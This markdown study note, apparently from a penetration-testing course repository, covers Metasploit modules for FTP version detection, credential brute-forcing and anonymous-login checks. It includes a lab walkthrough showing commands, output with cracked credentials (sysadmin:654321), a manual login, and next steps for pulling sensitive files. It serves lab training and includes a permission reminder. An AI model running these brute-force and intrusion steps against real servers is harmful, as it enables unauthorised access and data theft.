# Metasploit - FTP Enumeration Modules

**Path:** `service-enumeration/ftp/metasploit.md`

## Purpose
Metasploit auxiliary modules to enumerate FTP services, test anonymous login, and perform credential checks.

## Where to save
`service-enumeration/ftp/metasploit.md`

## Key modules / usage
- `auxiliary/scanner/ftp/ftp_version` — detect FTP server version.
- `auxiliary/scanner/ftp/ftp_login` — brute-force FTP credentials.
- `auxiliary/scanner/ftp/anonymous` — test anonymous login.
- `ftp` (CLI) — manual interaction once credentials are known.

## Quick examples
```bash
# Detect FTP version
msfconsole -q
use auxiliary/scanner/ftp/ftp_version
set RHOSTS demo.ine.local
run

# Brute-force login (example)
use auxiliary/scanner/ftp/ftp_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/wordlists/users.txt
set PASS_FILE /usr/share/wordlists/passwords.txt
run

# Check anonymous login
use auxiliary/scanner/ftp/anonymous
set RHOSTS demo.ine.local
run

# Manual FTP
ftp demo.ine.local
```

## How to read common output
- `FTP Server: <name> <version>` — server and version detected.
- `Login Successful: user:pass` — valid credentials found.
- `Anonymous login allowed` — server accepts anonymous access.
- `220` banner — server greeting.
- `331` and `230` — password prompt and successful login.

## Practical tips
- Run `ftp_version` first to know version and check CVEs.
- Use small, targeted wordlists to avoid lockouts.
- Document exact output and timestamps for reporting.
- If anonymous access is allowed, check read/write permissions carefully.
- Respect lab/rules. Do not brute force on real targets without permission.

## INE lab example

### Input
```bash
# Detect version
use auxiliary/scanner/ftp/ftp_version
set RHOSTS demo.ine.local
run

# Brute-force
use auxiliary/scanner/ftp/ftp_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run

# Anonymous check
use auxiliary/scanner/ftp/anonymous
set RHOSTS demo.ine.local
run

# Manual FTP login
ftp demo.ine.local
```

### Output
```
[+] 192.228.115.3:21 - FTP Server: ProFTPD 1.3.5a

[+] 192.228.115.3:21 - Login Successful: sysadmin:654321

[+] demo.ine.local:21 - scanned 1 of 1 hosts (100% complete)
[+] Auxiliary module execution completed

Connected to demo.ine.local.
220 (ProFTPD 1.3.5a)
Name (demo.ine.local:root): sysadmin
331 Please specify the password.
Password:
230 User sysadmin logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

### Short analysis
- `ProFTPD 1.3.5a` detected. Check known issues for that version.  
- Found valid credentials `sysadmin:654321`. Use them to access the FTP service.  
- Anonymous login appears allowed on this host. If anonymous is allowed then attacker may list or upload files depending on permissions.  
- Next steps: list files (`ls`), download interesting files (`get <file>`), check for writable directories, and search for sensitive files. Record evidence and timestamps.
